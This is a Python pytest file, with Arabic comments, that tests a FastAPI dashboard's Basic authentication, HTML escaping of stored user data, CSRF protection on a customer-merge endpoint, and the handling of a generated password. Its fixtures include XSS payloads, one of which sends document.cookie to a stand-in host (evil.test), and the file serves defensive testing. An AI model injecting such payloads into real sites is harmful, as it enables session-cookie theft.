"""
اختبارات أمن لوحة التحكم:
1) مصادقة Basic إلزامية على كل /dashboard/* و /api/* بينما تبقى /health و /status عامة.
2) تهريب (escaping) بيانات المستخدم في الصفحات الجدولية — يمنع XSS مخزّنة
   (كانت تُبنى HTML خامًا عبر f-string ثم تُعلَّم |safe).
"""

import base64
import os
import re
from decimal import Decimal

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

import app.main as api
from app.database import models  # noqa: F401  (تسجيل الجداول على Base.metadata)
from app.database.db import Base

USER = "admin"
PASSWORD = "s3cr3t-password"

XSS_DESCRIPTION = "<script>fetch('//evil.test/?'+document.cookie)</script>"
XSS_PERSON = '<img src=x onerror="alert(1)">'
XSS_CATEGORY = "<svg/onload=alert(2)>"


def _auth_header(user: str = USER, password: str = PASSWORD) -> dict:
    token = base64.b64encode(f"{user}:{password}".encode()).decode("ascii")
    return {"Authorization": f"Basic {token}"}


def _extract_csrf(html: str) -> str:
    match = re.search(r'name="csrf_token" value="([^"]+)"', html)
    assert match, "صفحة الأطراف يجب أن تُضمّن رمز CSRF مخفيًا في النموذج"
    return match.group(1)


@pytest.fixture
def db_session():
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    TestingSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    session = TestingSession()
    try:
        yield session
    finally:
        session.close()
        Base.metadata.drop_all(engine)
        engine.dispose()


@pytest.fixture(autouse=True)
def _creds(monkeypatch):
    monkeypatch.setattr(api, "_DASHBOARD_USERNAME", USER)
    monkeypatch.setattr(api, "_DASHBOARD_PASSWORD", PASSWORD)


@pytest.fixture
def client(db_session):
    api.app.dependency_overrides[api.get_db] = lambda: db_session
    with TestClient(api.app) as c:
        yield c
    api.app.dependency_overrides.pop(api.get_db, None)


def _seed_xss_rows(db_session):
    db_session.add(
        models.Transaction(
            telegram_user_id=1,
            type="expense",
            amount=Decimal("10.00"),
            currency="ILS",
            person=XSS_PERSON,
            category=XSS_CATEGORY,
            description=XSS_DESCRIPTION,
            raw_message="x",
        )
    )
    db_session.add(
        models.Note(
            telegram_user_id=1,
            note_type="note",
            description=XSS_DESCRIPTION,
            person=XSS_PERSON,
            category=XSS_CATEGORY,
            raw_message="x",
        )
    )
    db_session.add(
        models.Task(
            telegram_user_id=1,
            description=XSS_DESCRIPTION,
            person=XSS_PERSON,
            status="pending",
            raw_message="x",
        )
    )
    db_session.commit()


def test_dashboard_pages_escape_user_input(client, db_session):
    """البيانات المخزّنة تُعرض مُهرَّبة — لا تُنفَّذ كـ HTML/Script."""
    _seed_xss_rows(db_session)

    resp = client.get("/dashboard/transactions", headers=_auth_header())
    assert resp.status_code == 200
    for raw in (XSS_DESCRIPTION, XSS_PERSON, XSS_CATEGORY):
        assert raw not in resp.text
    assert "&lt;script&gt;" in resp.text
    assert "&lt;img src=x" in resp.text
    assert "&lt;svg" in resp.text

    resp = client.get("/dashboard/tasks", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION not in resp.text and XSS_PERSON not in resp.text
    assert "&lt;script&gt;" in resp.text and "&lt;img src=x" in resp.text

    resp = client.get("/dashboard/notes", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION not in resp.text and XSS_PERSON not in resp.text
    assert "&lt;script&gt;" in resp.text and "&lt;img src=x" in resp.text


def test_api_returns_raw_json_but_html_never_unescaped(client, db_session):
    """JSON API يسلّم البيانات كما هي (لا HTML)، لكن صفحات اللوحة وحدها تُهرَّب."""
    _seed_xss_rows(db_session)
    resp = client.get("/api/transactions", headers=_auth_header())
    assert resp.status_code == 200
    assert XSS_DESCRIPTION in resp.text  # JSON خام — يُحرَّر برمجيًا فقط


def test_all_dashboard_and_api_routes_require_auth(client):
    protected = [
        "/dashboard",
        "/dashboard/transactions",
        "/dashboard/tasks",
        "/dashboard/notes",
        "/dashboard/budgets",
        "/dashboard/customers",
        "/dashboard/export",
        "/api/transactions",
        "/api/tasks",
        "/api/budgets",
    ]
    for path in protected:
        assert client.get(path).status_code == 401, f"{path} يجب أن يرفض بلا مصادقة"
    # بيانات صحيحة تكفي للوصول
    for path in protected:
        resp = client.get(path, headers=_auth_header())
        assert resp.status_code == 200, f"{path} يجب أن يُقبل بالمصادقة"


def test_wrong_credentials_rejected(client):
    wrong = _auth_header(password="wrong")
    assert client.get("/dashboard/transactions", headers=wrong).status_code == 401
    assert client.get("/api/transactions", headers=wrong).status_code == 401


def test_health_endpoints_remain_public(client):
    assert client.get("/health").status_code == 200
    assert client.get("/status").status_code == 200
    assert client.get("/").status_code == 200


def test_new_ui_features_require_auth_and_render(client, db_session):
    """الصفحات الجديدة (الأطراف، الدمج، التصدير) خلف المصادقة وتعرض بيانات فعلية."""
    db_session.add(
        models.Transaction(
            telegram_user_id=1,
            type="expense",
            amount=Decimal("25.00"),
            currency="ILS",
            person="مؤسسة الشمس",
            category="مواد خام",
            description="شراء لوازم",
            raw_message="x",
        )
    )
    db_session.commit()

    assert client.get("/dashboard/customers").status_code == 401

    resp = client.get("/dashboard/customers", headers=_auth_header())
    assert resp.status_code == 200
    assert "مؤسسة الشمس" in resp.text

    resp = client.get(
        "/dashboard/transactions?export=xlsx", headers=_auth_header()
    )
    assert resp.status_code == 200
    assert resp.headers.get("content-type", "").startswith(
        "application/vnd.openxmlformats"
    )
    assert resp.content.startswith(b"PK")

    resp = client.get(
        "/dashboard/transactions?page=1&page_size=5", headers=_auth_header()
    )
    assert resp.status_code == 200
    assert "المعاملات المالية" in resp.text

    for fmt in ("xlsx", "pdf"):
        resp = client.get(f"/dashboard/export?fmt={fmt}", headers=_auth_header())
        assert resp.status_code == 200, fmt
        content_type = resp.headers.get("content-type", "")
        if fmt == "xlsx":
            assert content_type.startswith("application/vnd.openxmlformats")
            assert resp.content.startswith(b"PK")
        else:
            assert content_type.startswith("application/pdf")
            assert resp.content.startswith(b"%PDF")


def test_merge_replaces_person_across_records(client, db_session):
    """دمج اسمين يعيد كتابة السجلّات كلها (معاملات/مهام/طلبيات/فواتير) —
    عبر المسار الشرعي: تحميل الصفحة (تصدر الكوكي) ثم POST بالرمز المضمّن."""
    db_session.add(
        models.Transaction(
            telegram_user_id=1,
            type="expense",
            amount=Decimal("10.00"),
            currency="ILS",
            person="محل النور",
            category="مواد",
            description="فاتورة 1",
            raw_message="x",
        )
    )
    db_session.add(
        models.Note(
            telegram_user_id=1,
            note_type="order",
            description="توصيل لمحل النور",
            person="محل النور",
            raw_message="x",
        )
    )
    db_session.add(
        models.Task(
            telegram_user_id=1,
            description="متابعة النور",
            person="النهور",
            status="pending",
            raw_message="x",
        )
    )
    db_session.commit()

    page = client.get("/dashboard/customers", headers=_auth_header())
    assert page.status_code == 200
    csrf = _extract_csrf(page.text)

    resp = client.post(
        "/dashboard/customers/merge",
        headers=_auth_header(),
        data={"source": "محل النور", "target": "محل النهار", "csrf_token": csrf},
    )
    assert resp.status_code in (200, 303)
    resp = client.get("/dashboard/customers", headers=_auth_header())
    assert resp.status_code == 200
    assert "محل النهار" in resp.text
    assert "محل النور" not in resp.text
    assert "النهور" in resp.text

    count = (
        db_session.query(models.Transaction)
        .filter(models.Transaction.person == "محل النهار")
        .count()
    )
    order_count = (
        db_session.query(models.Note)
        .filter(models.Note.person == "محل النهار", models.Note.note_type == "order")
        .count()
    )
    assert count == 1
    assert order_count == 1


class TestCSRFProtection:
    """حماية CSRF لـ POST الدمج: لا ينفَّذ شكل خارجي باعتماديات المستخدم."""

    def _seed_party(self, db_session):
        db_session.add(
            models.Transaction(
                telegram_user_id=1,
                type="expense",
                amount=Decimal("5.00"),
                currency="ILS",
                person="طرف_csrf",
                category="اختبار",
                description="row for CSRF form",
                raw_message="x",
            )
        )
        db_session.commit()

    def test_customers_page_embeds_token_and_sets_cookie(self, client, db_session):
        self._seed_party(db_session)
        resp = client.get("/dashboard/customers", headers=_auth_header())
        assert resp.status_code == 200
        token = _extract_csrf(resp.text)
        assert len(token) >= 20
        set_cookie = next(
            (v for k, v in resp.headers.items() if k.lower() == "set-cookie"), ""
        )
        assert "sb_csrf" in set_cookie
        assert "samesite=strict" in set_cookie.lower()
        assert "httponly" in set_cookie.lower()

    def test_merge_without_csrf_rejected(self, client):
        resp = client.post(
            "/dashboard/customers/merge",
            headers=_auth_header(),
            data={"source": "أ", "target": "ب"},
        )
        assert resp.status_code == 403

    def test_merge_with_mismatched_token_rejected(self, client, db_session):
        resp = client.post(
            "/dashboard/customers/merge",
            headers=_auth_header(),
            data={
                "source": "أ",
                "target": "ب",
                "csrf_token": "forged-token-value-that-is-quite-long-12345",
            },
        )
        assert resp.status_code == 403

    def test_merge_from_foreign_origin_rejected(self, client, db_session):
        resp = client.post(
            "/dashboard/customers/merge",
            headers={**_auth_header(), "Origin": "https://evil.example"},
            data={"source": "أ", "target": "ب"},
        )
        assert resp.status_code == 403


def test_generated_dashboard_password_never_logged(tmp_path, monkeypatch, caplog):
    """كلمة المرور المؤقتة تُكتب لملف منفصل (0600) ولا تُطبع في السجلات العامة."""
    import logging

    import app.main as api

    monkeypatch.setattr(api.settings, "dashboard_password", "")
    monkeypatch.setattr(api.settings, "dashboard_username", "operator")
    cred_file = tmp_path / "creds.txt"
    monkeypatch.setattr(api, "_DASHBOARD_CRED_FILE", str(cred_file))

    with caplog.at_level(logging.WARNING, logger="app.dashboard"):
        username, password = api._generate_dashboard_credentials()

    assert username == "operator"
    assert len(password) > 10
    assert password not in caplog.text
    content = cred_file.read_text(encoding="utf-8")
    assert f"DASHBOARD_USERNAME={username}" in content
    assert f"DASHBOARD_PASSWORD={password}" in content
    if os.name != "nt":  # صلاحيات الملف مقيدة على منصات POSIX فقط
        assert (cred_file.stat().st_mode & 0o777) == 0o600


def test_explicit_dashboard_password_not_touched(tmp_path, monkeypatch, caplog):
    """عند ضبط DASHBOARD_PASSWORD لا يُكتب أي ملف ولا يُسجَّل تلميح توليد."""
    import logging

    import app.main as api

    monkeypatch.setattr(api.settings, "dashboard_password", PASSWORD)
    monkeypatch.setattr(api, "_DASHBOARD_CRED_FILE", str(tmp_path / "creds.txt"))

    with caplog.at_level(logging.WARNING, logger="app.dashboard"):
        username, password = api._generate_dashboard_credentials()

    assert username == USER
    assert password == PASSWORD
    assert not (tmp_path / "creds.txt").exists()
    assert "ولدّت كلمة مرور مؤقتة" not in caplog.text
